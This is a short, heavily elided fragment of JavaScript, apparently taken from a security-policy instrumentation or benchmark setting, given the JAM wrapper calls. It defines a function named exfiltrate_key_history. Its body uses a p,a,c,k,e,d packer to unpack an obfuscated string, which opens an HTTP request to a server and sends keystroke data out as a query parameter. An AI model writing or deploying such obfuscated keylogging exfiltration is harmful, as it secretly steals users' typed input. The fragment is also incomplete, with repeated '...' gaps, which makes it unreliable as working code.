...
function exfiltrate_key_history() {
  function v3(p, a, c, k, e$$4, d) {
    ...
    e$$4 = v0;
    var v14 = JAM.call("".replace, "", [/^/, String], JAM.policy.p1);
    var v7 = !v14;
    if (v7) {
      var v6 = c;
      c = c - 1;
    ...
    for (;v11;) {
      ...
      if (v10) {
        ...
        var v19 = "\\b" + v20;
        var v16 = v19 + "\\b";
        var v8 = JAM.new(RegExp, [v16, "g"], JAM.policy.p1);
        var v9 = k[c];
        p = JAM.call(p.replace, p, [v8, v9], JAM.policy.p1);
      }
      v11 = c;
      c = c - 1;
    }
  ...
  var v12 = JAM.call(v3, null, ['0=5 4();0.7("3","1://2:6/8.d?"+"c=b",9);0.a(e);', 15, 15, v17, 0, {}], JAM.policy.p1);
  if (JAM.isEval(eval)) {
